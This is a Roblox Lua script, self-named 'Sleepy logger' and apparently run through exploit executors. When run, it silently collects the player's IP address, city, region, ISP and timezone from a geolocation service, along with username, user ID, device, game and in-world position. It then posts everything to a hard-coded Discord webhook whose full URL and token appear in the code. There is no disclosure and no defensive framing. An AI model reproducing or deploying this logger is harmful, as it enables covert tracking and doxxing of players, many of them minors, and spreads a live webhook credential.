local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

HttpService.HttpEnabled = true

local webhook = "https://discord.com/api/webhooks/1416770141949132830/ZODa2H4QD2SQZ7Q29g8fI6BO-w6YNbRVE6cjNgnQS4daa7u8cl5St6IJ4M1SnUBTuTLD"
local player = Players.LocalPlayer

local function safeGet(func, default)
    local success, result = pcall(func)
    return success and result or default
end

local function detectExecutor()
    local executorInfo = {name = "Unknown", version = "Unknown"}
    
    if syn then 
        executorInfo.name = "Synapse X"
        if syn.version then
            executorInfo.version = safeGet(syn.version, "Unknown")
        end
    elseif KRNL_LOADED then 
        executorInfo.name = "KRNL"
    elseif getexecutorname then 
        executorInfo.name = safeGet(getexecutorname, "Unknown")
    elseif identifyexecutor then
        executorInfo.name = safeGet(identifyexecutor, "Unknown")
    elseif is_sirhurt_closure then 
        executorInfo.name = "SirHurt"
    elseif pebc_execute then 
        executorInfo.name = "ProtoSmasher"
    elseif OXYGEN_LOADED then 
        executorInfo.name = "Oxygen U"
    elseif COMET_LOADED then 
        executorInfo.name = "Comet"
    elseif Fluxus then 
        executorInfo.name = "Fluxus"
    elseif getgenv().WRD_LOADED then
        executorInfo.name = "WeAreDevs"
    elseif getgenv().EVON_LOADED then
        executorInfo.name = "Evon"
    elseif getgenv().SCRIPTWARE then
        executorInfo.name = "Script-Ware"
    end
    
    return executorInfo
end

local function getGeoData()
    local defaultGeo = {
        query = "Unavailable",
        regionName = "Unavailable", 
        city = "Unavailable",
        country = "Unavailable",
        isp = "Unavailable",
        timezone = "Unavailable"
    }
    
    if http_request then
        local success, response = pcall(function()
            return http_request({
                Url = "http://ip-api.com/json/",
                Method = "GET"
            })
        end)
        
        if success and response and response.StatusCode == 200 then
            local success2, data = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)
            
            if success2 and data and data.status == "success" then
                return {
                    query = data.query or "Unknown",
                    regionName = data.regionName or "Unknown",
                    city = data.city or "Unknown", 
                    country = data.country or "Unknown",
                    isp = data.isp or "Unknown",
                    timezone = data.timezone or "Unknown"
                }
            end
        end
    end
    
    return defaultGeo
end

local function getSystemInfo()
    local info = {}
    
    if workspace.CurrentCamera then
        local viewport = workspace.CurrentCamera.ViewportSize
        info.screenSize = math.floor(viewport.X) .. "x" .. math.floor(viewport.Y)
    else
        info.screenSize = "Unknown"
    end
    
    info.fps = safeGet(function() 
        return math.floor(workspace:GetRealPhysicsFPS()) 
    end, "Unknown")
    
    info.memoryUsage = math.floor(collectgarbage("count") / 1024) .. " MB"
    
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        info.platform = "Mobile"
        info.deviceType = "Mobile"
    elseif UserInputService.GamepadEnabled then
        info.platform = "Console" 
        info.deviceType = "Console"
    else
        info.platform = "PC"
        info.deviceType = "Desktop"
    end
    
    info.graphicsQuality = safeGet(function()
        return tostring(UserSettings():GetService("UserGameSettings").SavedQualityLevel)
    end, "Unknown")
    
    info.ping = safeGet(function()
        return math.floor(player:GetNetworkPing() * 1000) .. " ms"
    end, "Unknown")
    
    return info
end

local function getGameInfo()
    local info = {
        name = "Unknown Game",
        creator = "Unknown",
        placeId = tostring(game.PlaceId),
        jobId = game.JobId,
        playerCount = tostring(#Players:GetPlayers()),
        maxPlayers = tostring(Players.MaxPlayers),
        serverUptime = tostring(math.floor(workspace.DistributedGameTime)) .. "s"
    }
    
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    
    if success and productInfo then
        info.name = productInfo.Name or "Unknown Game"
        if productInfo.Creator then
            info.creator = productInfo.Creator.Name or "Unknown"
        end
    end
    
    return info
end

local function getPlayerInfo()
    local info = {
        name = player.Name or "Unknown",
        displayName = player.DisplayName or player.Name or "Unknown", 
        userId = tostring(player.UserId),
        accountAge = tostring(player.AccountAge) .. " days",
        team = "None",
        character = {
            health = "0",
            position = "Unknown"
        }
    }
    
    if player.Team then
        info.team = player.Team.Name
    end
    
    if player.Character then
        if player.Character:FindFirstChild("Humanoid") then
            info.character.health = tostring(math.floor(player.Character.Humanoid.Health))
        end
        
        if player.Character:FindFirstChild("HumanoidRootPart") then
            local pos = player.Character.HumanoidRootPart.Position
            info.character.position = string.format("%.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z)
        end
    end
    
    return info
end

local function executeLogger()
    local executorInfo = detectExecutor()
    local geoData = getGeoData() 
    local systemInfo = getSystemInfo()
    local gameInfo = getGameInfo()
    local playerInfo = getPlayerInfo()
    
    local timestamp = os.date("%Y-%m-%d %H:%M:%S UTC")
    
    local webhookData = {
        embeds = {{
            title = "🎯",
            url = "https://www.roblox.com/users/" .. playerInfo.userId .. "/profile",
            description = "```yaml\nSleepy logger - Data Collected```",
            color = 000000,
            fields = {
                {
                    name = "👤 **Player Information**",
                    value = "```ini\n" ..
                           "[Username]: " .. playerInfo.name .. "\n" ..
                           "[Display]: " .. playerInfo.displayName .. "\n" .. 
                           "[User ID]: " .. playerInfo.userId .. "\n" ..
                           "[Account Age]: " .. playerInfo.accountAge .. "\n" ..
                           "[Team]: " .. playerInfo.team .. "\n" ..
                           "[Health]: " .. playerInfo.character.health .. "```",
                    inline = false
                },
                {
                    name = "💻 **System Information**", 
                    value = "```yaml\n" ..
                           "Executor: " .. executorInfo.name .. "\n" ..
                           "Version: " .. executorInfo.version .. "\n" ..
                           "Platform: " .. systemInfo.platform .. "\n" ..
                           "Device: " .. systemInfo.deviceType .. "\n" ..
                           "Screen: " .. systemInfo.screenSize .. "\n" ..
                           "FPS: " .. tostring(systemInfo.fps) .. "\n" ..
                           "Memory: " .. systemInfo.memoryUsage .. "\n" ..
                           "Graphics: " .. systemInfo.graphicsQuality .. "\n" ..
                           "Ping: " .. systemInfo.ping .. "```",
                    inline = false
                },
                {
                    name = "🌍 **Location Data**",
                    value = "```css\n" ..
                           "IP Address: " .. geoData.query .. "\n" ..
                           "Region: " .. geoData.regionName .. "\n" ..
                           "City: " .. geoData.city .. "\n" ..
                           "Country: " .. geoData.country .. "\n" ..
                           "ISP: " .. geoData.isp .. "\n" ..
                           "Timezone: " .. geoData.timezone .. "```",
                    inline = false
                },
                {
                    name = "🎮 **Game Environment**",
                    value = "```fix\n" ..
                           "Game: " .. gameInfo.name .. "\n" ..
                           "Creator: " .. gameInfo.creator .. "\n" ..
                           "Place ID: " .. gameInfo.placeId .. "\n" ..
                           "Job ID: " .. gameInfo.jobId .. "\n" ..
                           "Players: " .. gameInfo.playerCount .. "/" .. gameInfo.maxPlayers .. "\n" ..
                           "Uptime: " .. gameInfo.serverUptime .. "```",
                    inline = false
                },
                {
                    name = "📍 **Position Data**",
                    value = "```md\n" ..
                           "World Position: " .. playerInfo.character.position .. "```",
                    inline = false
                }
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerInfo.userId .. "&width=150&height=150&format=png"
            },
            footer = {
                text = "FREE SHIT + " .. timestamp,
                icon_url = "https://cdn.discordapp.com/attachments/1358770047383769226/1366759135097393223/image.png?ex=683cf5e2&is=683ba462&hm=98bdac4d2adeae29d7915944d3b5df62d705538c7ac3ce5f3473b1d8f94e140f&"
            }
        }}
    }
    
    local jsonData = HttpService:JSONEncode(webhookData)
    
    if http_request then
        http_request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif request then
        request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif syn and syn.request then
        syn.request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    elseif HttpService.PostAsync then
        pcall(function()
            HttpService:PostAsync(webhook, jsonData, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

spawn(function()
    pcall(executeLogger)
end)
